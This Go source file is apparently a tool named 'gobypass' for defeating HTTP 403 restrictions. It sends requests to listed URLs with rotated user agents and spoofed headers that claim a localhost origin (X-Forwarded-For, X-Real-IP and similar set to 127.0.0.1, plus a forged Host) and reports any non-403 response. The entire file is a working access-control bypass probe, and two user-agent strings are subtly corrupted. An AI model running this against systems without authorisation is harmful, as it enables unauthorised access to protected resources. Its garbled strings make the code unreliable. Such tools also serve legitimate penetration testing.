package gobypass

import (
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"os"
	"sync"
	"time"
)

func CheckError(err error) {
	if err != nil {
		log.Fatal(err)
		os.Exit(1)
	}
}

type headers struct {
	name  string
	value string
}

var bypassheaders = []headers{
	headers{name: "Forwarded-For-Ip", value: "127.0.0.1"},
	headers{name: "X-Forwarded-For", value: "127.0.0.1"},
	headers{name: "Forwarded-For", value: "127.0.0.1"},
	headers{name: "Forwarded", value: "127.0.0.1"},
	headers{name: "X-Forwarded-For-Original", value: "127.0.0.1"},
	headers{name: "X-Forwarded-By", value: "127.0.0.1"},
	headers{name: "X-Forwarded", value: "127.0.0.1"},
	headers{name: "X-Real-IP", value: "127.0.0.1"},
	headers{name: "X-Custom-IP-Authorization", value: "127.0.0.1"},
	headers{name: "Host", value: "google.com"},
}

func getRandomAgent() string {
	random := rand.New(rand.NewSource(time.Now().UnixNano()))
	useragents := []string{
		"Mozilla $/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
		"Moz	illa/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
		"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
	}

	return useragents[random.Intn(len(useragents))]
}

func Bypass(urls *[]string, wg *sync.WaitGroup) {
	defer wg.Done()
	client := http.Client{
		Timeout: time.Second * 5,
	}
	for _, url := range *urls {
		req, err := http.NewRequest("GET", url, nil)
		CheckError(err)
		req.Header.Add("User-Agent", getRandomAgent())
		for _, header := range bypassheaders {
			req.Header.Add(header.name, header.value)
			resp, err := client.Do(req)
			CheckError(err)
			if resp.StatusCode != 403 {
				fmt.Printf("Check Manually! Url: %v\nUsing: %v: %v (%v)\n\n", url, header.name, header.value, resp.StatusCode)
			}
		}

	}
}
